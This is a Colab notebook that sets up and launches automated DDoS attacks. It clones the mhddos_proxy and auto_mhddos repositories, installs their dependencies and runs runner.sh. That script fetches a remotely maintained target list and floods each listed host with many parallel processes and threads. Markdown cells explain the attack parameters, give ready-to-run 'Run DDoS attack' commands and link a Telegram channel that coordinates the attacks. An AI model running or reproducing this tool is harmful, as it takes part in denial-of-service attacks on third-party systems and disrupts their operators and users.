{
 "nbformat": 4,
 "nbformat_minor": 0,
 "metadata": {
  "colab": {
   "name": "auto_mhddos.ipynb",
   "private_outputs": true,
   "provenance": [],
   "collapsed_sections": []
  },
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3"
  },
  "language_info": {
   "name": "python"
  }
 },
 "cells": [
  {
   "cell_type": "markdown",
   "source": [
    "#======================================\n",
    "# Menu \"Runtime\" -> \"Run all\" (Ctrl/⌘ + F9)\n",
    "#======================================\n",
    "\n",
    "If no menu at the top, disable adBlock\n",
    "\n",
    "---\n",
    "\n",
    "This tool uses [mhddos-proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) to attack targets from [targets file](https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets). Targets are refreshed automatically.\n",
    "\n",
    "---\n",
    "\n",
    "Telegram channel: [Украинский жнец (DDoS)](https://t.me/ukrainian_reaper_ddos)"
   ],
   "metadata": {
    "id": "02jB8Um4KqQS"
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "## Documentation"
   ],
   "metadata": {
    "id": "8Uw9xUaMCq4x"
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "---\n",
    "\n",
    "### Parameters\n",
    "\n",
    "*   `-r`, `--refresh-interval`. How frequently script should refresh targets. Download targets from [targets file](https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets) every NUMBER time units. SUFFIX may be \"m\" for minutes, \"h\" for hours or \"d\" for days. Suggested range: [10m, 1d]. Default: \"15m\"\n",
    "\n",
    "*   `-p`, `--process-count`. How many separate [mhddos-proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) instances should run for each target. Note, _more_ is not necessarily _better_. It is important to monitor network stats. Suggested range [1, 8]. Default: \"5\"\n",
    "\n",
    "*   `-t`, `--thread-count`. How many threads should send requests to a given target in parallel. Note, _more_ is not necessarily _better_. It is important to monitor network stats. Suggested range [250, 2000]. Default: \"1000\"\n",
    "\n",
    "*   `-s`, `--stats-interval`. Frequentcy of network statistics output in seconds (i.e every N seconds). Format is \"HH:MM:SS\" - time in GMT+0, \"Kbps in\" - inbound traffic, \"Kbps out\" - outbound traffic. Example:\n",
    "```\n",
    "  Time           eth0       \n",
    "HH:MM:SS   Kbps in  Kbps out\n",
    "18:10:34   6939.88  152080.2\n",
    "18:10:44   6316.50  136691.0\n",
    "18:10:54   6737.13  147879.0\n",
    "18:11:04   6686.07  145726.9\n",
    "```\n",
    "Suggested range [10, 300]. Default: \"30\"\n",
    "\n",
    "\n",
    "Please note, that _target_ is as single line from [targets file](https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets) that might contain multiple domains or IP addresses.\n",
    "\n",
    "---\n",
    "\n",
    "###Example commands\n",
    "\n",
    "* Run DDoS attack with all defaults\n",
    "```\n",
    "!bash runner.sh\n",
    "```\n",
    "\n",
    "* Run DDoS attack with with targets refreshed every 3 hours, spawning 1 mhddos proccess per target with 1000 threads each. Netwrok information is printed every 10 seconds.\n",
    "```\n",
    "!bash runner.sh --refresh-interval 3h --thread-count 1000 --process-count 1 --stats-interval 10\n",
    "```\n",
    "\n",
    "* Same command using short options\n",
    "```\n",
    "!bash runner.sh -r 3h -t 1000 -p 1 -s 10\n",
    "```\n",
    "\n",
    "Long and short options can be mixed in a single command. Order of options does not matter. No options are required.\n",
    "\n",
    "---"
   ],
   "metadata": {
    "id": "e6KJLi-5Ih6R"
   }
  },
  {
   "cell_type": "markdown",
   "source": [
    "## SETUP"
   ],
   "metadata": {
    "id": "ge0NKhvpBvZK"
   }
  },
  {
   "cell_type": "code",
   "source": [
    "!apt-get install ifstat -y &> /dev/null\n",
    "!apt-get upgrade ifstat -y &> /dev/null\n",
    "\n",
    "!python -m pip uninstall google-colab datascience -y &> /dev/null\n",
    "!python -m pip install --upgrade pip &> /dev/null\n",
    "\n",
    "%cd ~\n",
    "\n",
    "%rm -r auto_mhddos &> /dev/null\n",
    "!git clone https://github.com/white-sagittarius/auto_mhddos.git &> /dev/null\n",
    "\n",
    "%rm -r mhddos_proxy &> /dev/null\n",
    "!git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git &> /dev/null\n",
    "%cd mhddos_proxy\n",
    "!python3 -m pip install -r requirements.txt &> /dev/null\n",
    "\n",
    "%cd ~/auto_mhddos"
   ],
   "metadata": {
    "id": "iwL1D0yQ2Y5X"
   },
   "execution_count": null,
   "outputs": []
  },
  {
   "cell_type": "markdown",
   "source": [
    "## RUN"
   ],
   "metadata": {
    "id": "9ZHLG9gfB0eK"
   }
  },
  {
   "cell_type": "code",
   "source": [
    "!bash runner.sh"
   ],
   "metadata": {
    "id": "5R0oboScD87x"
   },
   "execution_count": null,
   "outputs": []
  }
 ]
}